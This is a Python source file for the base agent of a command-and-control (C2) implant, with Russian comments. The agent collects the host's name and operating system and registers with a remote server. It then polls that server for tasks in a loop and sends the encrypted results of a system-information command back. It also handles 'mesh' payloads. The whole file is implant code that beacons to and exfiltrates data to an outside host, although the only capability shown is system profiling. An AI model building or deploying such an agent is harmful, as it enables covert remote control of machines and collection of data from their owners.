import time
import asyncio
import uuid
import platform
import requests
from agents.commands import sysinfo
from agents.crypto import encrypt, decrypt
from shared.config import SERVER_URL

class BaseAgent:
    def __init__(self):
        self.agent_id = str(uuid.uuid4())
        self.hostname = platform.node()
        self.platform = platform.system()
        self.running = True

    def register(self):
        """ Регистрируется на C2-сервере. """
        try:
            res = requests.post(f"{SERVER_URL}/agents/register", json={
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "platform": self.platform
            })
            if res.status_code == 200:
                print(f"[Agent:{self.agent_id}] Registered successfully.")
            else:
                print(f"[Agent:{self.agent_id}] Registration failed: {res.text}")
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Registration error: {e}")

    def fetch_tasks(self):
        """ Запрашивает задачи с сервера. """
        try:
            res = requests.get(f"{SERVER_URL}/tasks/{self.agent_id}")
            if res.status_code == 200:
                return res.json()
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Task fetch error: {e}")
        return []

    def send_result(self, task_id, result):
        """ Отправляет результат выполнения задачи. """
        try:
            res = requests.post(f"{SERVER_URL}/results/", json={
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": encrypt(result)
            })
            if res.status_code == 200:
                print(f"[Agent:{self.agent_id}] Result sent for task {task_id}")
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Result send error: {e}")

    def run_task(self, task):
        """ Выполняет задачу и возвращает результат. """
        command = task.get("command")
        task_id = task.get("id")

        if command == "sysinfo":
            result = sysinfo.run()
        else:
            result = f"Unknown command: {command}"

        self.send_result(task_id, result)

    async def run(self):
        """ Основной цикл агента. """
        self.register()

        while self.running:
            tasks = self.fetch_tasks()
            for task in tasks:
                self.run_task(task)
            await asyncio.sleep(5)

    async def process_payload(self, payload):
        """
        Обработка входящей полезной нагрузки (например, команды, пришедшей через mesh).
        Поддерживает те же команды, что и run_task, но payload может быть другим форматом.
        """
        cmd_type = payload.get("type")
        if cmd_type == "sysinfo":
            result = sysinfo.run()
            # Если нужно, здесь можно добавить логику отправки результата обратно в mesh
            print(f"[Agent:{self.agent_id}] sysinfo command executed via mesh")
        elif cmd_type == "ping":
            # Простой ответ на ping
            print(f"[Agent:{self.agent_id}] Received ping from {payload.get('from')}")
        else:
            print(f"[Agent:{self.agent_id}] Unknown payload type: {cmd_type}")
